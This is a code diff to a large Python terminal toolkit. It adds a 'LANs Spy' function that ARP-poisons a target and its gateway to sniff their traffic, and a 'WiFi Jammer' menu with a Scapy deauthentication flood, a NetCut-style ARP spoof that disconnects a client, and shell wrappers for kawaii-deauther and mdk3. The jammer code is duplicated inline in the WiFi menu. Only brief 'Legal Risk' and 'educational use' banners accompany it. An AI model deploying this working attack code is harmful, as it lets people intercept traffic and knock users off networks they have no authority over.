@@ -18892,6 +18892,8 @@ def feature_pentest_toolkit():
         print(f" {BOLD}[6]{RESET} 🌊 Hydra - Brute-force Tool")
         print(f" {BOLD}[7]{RESET} 📚 Install Missing Tools")
         print(f" {BOLD}[8]{RESET} 📦 Open Download Center (Pen Test Tools)")
+        print(f" {BOLD}[9]{RESET} 📶 WiFi JammER ⚠️ Legal Risk")
+        print(f" {BOLD}[10]{RESET} 🕵️ LANs SPY ⚠️ Legal Risk")
         print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
         print(f"{BOLD}{c}╚{'═'*50}╝{RESET}")
 
@@ -18931,6 +18933,10 @@ def feature_pentest_toolkit():
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
         elif choice == '8':
             feature_download_center()
+        elif choice == '9':
+            feature_wifi_jammer()
+        elif choice == '10':
+            feature_lans_spy()
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
@@ -27854,6 +27860,177 @@ def feature_network_sparkline():
         pass
     input(f"\n\n{BOLD}[ 🏁 Tracking Finished. Press Enter... ]{RESET}")
 
+def feature_lans_spy():
+    """LANs Spy: ARP Poisoning and Packet Sniffing Tool (Python 3+ with Scapy)"""
+    print_header("🕵️ LANs Spy (ARP Poison/Packet Sniff) ⚠️ Legal Risk")
+    print("This tool performs ARP poisoning for man-in-the-middle attacks and packet sniffing.")
+    print("⚠️  LEGAL WARNING: Only use on networks you own or have permission to test!")
+    print("Requires: Scapy, root/admin privileges\n")
+
+    try:
+        import scapy.all as scapy
+    except ImportError:
+        print(f"{COLORS['1'][0]}❌ Scapy not installed. Install with: pip install scapy{RESET}")
+        input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        return
+
+    iface = input("Network interface (e.g., eth0, wlan0): ").strip()
+    if not iface:
+        print(f"{COLORS['1'][0]}No interface specified.{RESET}")
+        input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        return
+
+    target_ip = input("Target IP address: ").strip()
+    gateway_ip = input("Gateway IP address: ").strip()
+
+    if not target_ip or not gateway_ip:
+        print(f"{COLORS['1'][0]}Target and gateway IPs required.{RESET}")
+        input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+        return
+
+    try:
+        # Get MAC addresses
+        target_mac = scapy.get_mac_by_ip(target_ip)
+        gateway_mac = scapy.get_mac_by_ip(gateway_ip)
+        attacker_mac = scapy.get_if_hwaddr(iface)
+
+        print(f"\n🔍 Target MAC: {target_mac}")
+        print(f"🔍 Gateway MAC: {gateway_mac}")
+        print(f"🔍 Attacker MAC: {attacker_mac}")
+
+        # Create ARP poison packets
+        poison_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        poison_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+
+        print(f"\n⚠️  Starting ARP poisoning... Press Ctrl+C to stop.")
+
+        import threading
+        import time
+
+        def poison():
+            while True:
+                scapy.send(poison_target, verbose=0)
+                scapy.send(poison_gateway, verbose=0)
+                time.sleep(2)
+
+        poison_thread = threading.Thread(target=poison)
+        poison_thread.daemon = True
+        poison_thread.start()
+
+        # Packet sniffing
+        def packet_callback(packet):
+            if packet.haslayer(scapy.IP):
+                src_ip = packet[scapy.IP].src
+                dst_ip = packet[scapy.IP].dst
+                if packet.haslayer(scapy.TCP):
+                    proto = "TCP"
+                    sport = packet[scapy.TCP].sport
+                    dport = packet[scapy.TCP].dport
+                elif packet.haslayer(scapy.UDP):
+                    proto = "UDP"
+                    sport = packet[scapy.UDP].sport
+                    dport = packet[scapy.UDP].dport
+                else:
+                    proto = "Other"
+                    sport = dport = "N/A"
+                print(f"📦 {proto} {src_ip}:{sport} -> {dst_ip}:{dport}")
+
+        try:
+            scapy.sniff(iface=iface, prn=packet_callback, store=0)
+        except KeyboardInterrupt:
+            pass
+
+        print(f"\n🛑 Stopping ARP poisoning...")
+
+        # Restore ARP tables
+        restore_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+        restore_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
+
+        scapy.send(restore_target, count=4, verbose=0)
+        scapy.send(restore_gateway, count=4, verbose=0)
+
+        print("✅ ARP tables restored.")
+
+    except Exception as e:
+        print(f"{COLORS['1'][0]}❌ Error: {e}{RESET}")
+
+    input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
+
+def feature_wifi_jammer():
+    """WiFi Jammer Toolkit (⚠️ Legal Risk)"""
+    while True:
+        print_header("📶 WiFi Jammer Toolkit (⚠️ For Educational Use Only)")
+        print(f" {BOLD}[1]{RESET} Python/Scapy Deauth Jammer")
+        print(f" {BOLD}[2]{RESET} NetCut-Style Client Kicker")
+        print(f" {BOLD}[3]{RESET} Kawaii Deauther/MDK3 Wrapper")
+        print(f" {BOLD}[0]{RESET} Return")
+        jammer_choice = input(f"\n{BOLD}Select Jammer Method (0-3): {RESET}").strip()
+
+        if jammer_choice == '0':
+            break
+        elif jammer_choice == '1':
+            print_header("Python/Scapy Deauth Jammer")
+            print("This tool sends deauthentication frames to jam a WiFi network. Root/admin required.\n")
+            iface = input("Interface (e.g., wlan0): ").strip()
+            ap_mac = input("Target AP MAC (BSSID): ").strip()
+            client_mac = input("Client MAC (leave blank for broadcast): ").strip() or "ff:ff:ff:ff:ff:ff"
+            count = input("Number of packets (default 100): ").strip()
+            try:
+                count = int(count) if count else 100
+            except:
+                count = 100
+            try:
+                from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+                pkt = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
+                print(f"\nSending {count} deauth packets on {iface} to {client_mac} via {ap_mac}...")
+                sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
+                print("\n✅ Deauth attack completed.")
+            except ImportError:
+                print("[!] Scapy not installed or import failed.")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+        elif jammer_choice == '2':
+            print_header("NetCut-Style Client Kicker")
+            print("This tool performs ARP spoofing to disconnect a client from the network. Root/admin required.\n")
+            iface = input("Interface (e.g., eth0/wlan0): ").strip()
+            target_ip = input("Target Client IP: ").strip()
+            gateway_ip = input("Gateway/Router IP: ").strip()
+            count = input("Number of packets (default 50): ").strip()
+            try:
+                count = int(count) if count else 50
+            except:
+                count = 50
+            try:
+                from scapy.all import ARP, Ether, sendp, get_if_hwaddr
+                attacker_mac = get_if_hwaddr(iface)
+                arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=attacker_mac)
+                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+                pkt = ether/arp
+                print(f"\nSending {count} ARP spoof packets to {target_ip} (gateway {gateway_ip}) on {iface}...")
+                sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
+                print("\n✅ NetCut ARP spoof completed.")
+            except ImportError:
+                print("[!] Scapy not installed or import failed.")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+        elif jammer_choice == '3':
+            print_header("Kawaii Deauther/MDK3 Wrapper")
+            print("This tool wraps Kawaii Deauther or MDK3 for advanced WiFi jamming. Root/admin required.\n")
+            iface = input("Interface (e.g., wlan0): ").strip()
+            ap_mac = input("Target AP MAC (BSSID): ").strip()
+            mode = input("Mode: [1] Kawaii Deauther, [2] MDK3: ").strip()
+            if mode == '1':
+                print("\nRunning: kawaii-deauther -i {iface} -b {ap_mac}")
+                os.system(f"kawaii-deauther -i {iface} -b {ap_mac}")
+            elif mode == '2':
+                print("\nRunning: mdk3 {iface} d -b {ap_mac}")
+                os.system(f"mdk3 {iface} d -b {ap_mac}")
+            else:
+                print("[!] Invalid mode selected.")
+        else:
+            print(f"{COLORS['1'][0]}Invalid option{RESET}")
+        input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
+
 def feature_network_toolkit():
     """Enhanced network toolkit with packet analysis, bandwidth monitoring, and diagnostics."""
     while True:
@@ -27872,7 +28049,8 @@ def feature_network_toolkit():
         print(f"[11] 📡 Local Network Scanner")
         print(f"[12] 📦 Download Center (Network Tools)")
         print(f"[13] ↩️ Return to Main Menu")
-        net_choice = input("\n🎯 Select a tool (1-13): ").strip()
+        print(f"[14] 🕵️ LANs Spy (ARP Poison/Packet Sniff)")
+        net_choice = input("\n🎯 Select a tool (1-14): ").strip()
         if net_choice == '1': feature_network_sparkline()
         elif net_choice == '2':
             print_header("📊 Bandwidth Monitor")
@@ -28063,6 +28241,8 @@ def feature_network_toolkit():
             feature_download_center()
         elif net_choice == '13':
             break
+        elif net_choice == '14':
+            feature_lans_spy()
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
@@ -28248,11 +28428,87 @@ def feature_enhanced_wifi_toolkit():
         print(f" {BOLD}[13]{RESET} ⚙️ WiFi Optimization Tips")
         print(f" {BOLD}[14]{RESET} 🧰 15+ WiFi Apps Ecosystem")
         print(f" {BOLD}[15]{RESET} 💾 Save WiFi Health Report")
+
         print(f" {BOLD}[16]{RESET} ↩️ Return to Main Menu")
-        wifi_choice = input(f"\n{BOLD}🎯 Select WiFi Tool (1-16): {RESET}").strip()
+        print(f" {BOLD}[17]{RESET} 📶 Wifi Jammer (⚠️ Legal Risk)")
+        wifi_choice = input(f"\n{BOLD}🎯 Select WiFi Tool (1-17): {RESET}").strip()
+
 
         if wifi_choice == '16':
             break
+
+        elif wifi_choice == '17':
+            print_header("📶 WiFi Jammer Toolkit (⚠️ For Educational Use Only)")
+            print(f" {BOLD}[1]{RESET} Python/Scapy Deauth Jammer")
+            print(f" {BOLD}[2]{RESET} NetCut-Style Client Kicker")
+            print(f" {BOLD}[3]{RESET} Kawaii Deauther/MDK3 Wrapper")
+            print(f" {BOLD}[4]{RESET} Return to WiFi Menu")
+            jammer_choice = input(f"\n{BOLD}Select Jammer Method (1-4): {RESET}").strip()
+
+            if jammer_choice == '1':
+                print_header("Python/Scapy Deauth Jammer")
+                print("This tool sends deauthentication frames to jam a WiFi network. Root/admin required.\n")
+                iface = input("Interface (e.g., wlan0): ").strip()
+                ap_mac = input("Target AP MAC (BSSID): ").strip()
+                client_mac = input("Client MAC (leave blank for broadcast): ").strip() or "ff:ff:ff:ff:ff:ff"
+                count = input("Number of packets (default 100): ").strip()
+                try:
+                    count = int(count) if count else 100
+                except:
+                    count = 100
+                try:
+                    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+                    pkt = RadioTap()/Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
+                    print(f"\nSending {count} deauth packets on {iface} to {client_mac} via {ap_mac}...")
+                    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
+                    print("\n✅ Deauth attack completed.")
+                except ImportError:
+                    print("[!] Scapy not installed or import failed.")
+                except Exception as e:
+                    print(f"[!] Error: {e}")
+            elif jammer_choice == '2':
+                print_header("NetCut-Style Client Kicker")
+                print("This tool performs ARP spoofing to disconnect a client from the network. Root/admin required.\n")
+                iface = input("Interface (e.g., eth0/wlan0): ").strip()
+                target_ip = input("Target Client IP: ").strip()
+                gateway_ip = input("Gateway/Router IP: ").strip()
+                count = input("Number of packets (default 50): ").strip()
+                try:
+                    count = int(count) if count else 50
+                except:
+                    count = 50
+                try:
+                    from scapy.all import ARP, Ether, sendp, get_if_hwaddr
+                    attacker_mac = get_if_hwaddr(iface)
+                    arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=attacker_mac)
+                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+                    pkt = ether/arp
+                    print(f"\nSending {count} ARP spoof packets to {target_ip} (gateway {gateway_ip}) on {iface}...")
+                    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
+                    print("\n✅ NetCut ARP spoof completed.")
+                except ImportError:
+                    print("[!] Scapy not installed or import failed.")
+                except Exception as e:
+                    print(f"[!] Error: {e}")
+            elif jammer_choice == '3':
+                print_header("Kawaii Deauther/MDK3 Wrapper")
+                print("This tool wraps Kawaii Deauther or MDK3 for advanced WiFi jamming. Root/admin required.\n")
+                iface = input("Interface (e.g., wlan0): ").strip()
+                ap_mac = input("Target AP MAC (BSSID): ").strip()
+                mode = input("Mode: [1] Kawaii Deauther, [2] MDK3: ").strip()
+                if mode == '1':
+                    print("\nRunning: kawaii-deauther -i {iface} -b {ap_mac}")
+                    os.system(f"kawaii-deauther -i {iface} -b {ap_mac}")
+                elif mode == '2':
+                    print("\nRunning: mdk3 {iface} d -b {ap_mac}")
+                    os.system(f"mdk3 {iface} d -b {ap_mac}")
+                else:
+                    print("[!] Invalid mode selected.")
+            elif jammer_choice == '4':
+                return
+            else:
+                print(f"{COLORS['1'][0]}Invalid option{RESET}")
+            input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
 
         if wifi_choice == '1':
             print_header("🔍 WiFi Interface Detection")
@@ -45520,7 +45776,7 @@ if __name__ == "__main__":
 # Added WebSSH health checks and auto-connect URL building for the dashboard, plus a JSON
 # stats endpoint so the backend can serve data in JSON or HTML. The Remote Dashboard now
 # reports WebSSH install/running status, avoids a broken iframe when it is down, and builds
-# a connection URL using the current host and user to help the terminal auto-connect.
+# a connection URL usi  ng the current host and user to help the terminal auto-connect.
 # See the new WebSSH helpers and status fields in
 # Version 21.1 - Autonomous System Optimizer & WebSSH Terminal
 # Added the new Autonomous System Optimizer that runs in the background and uses
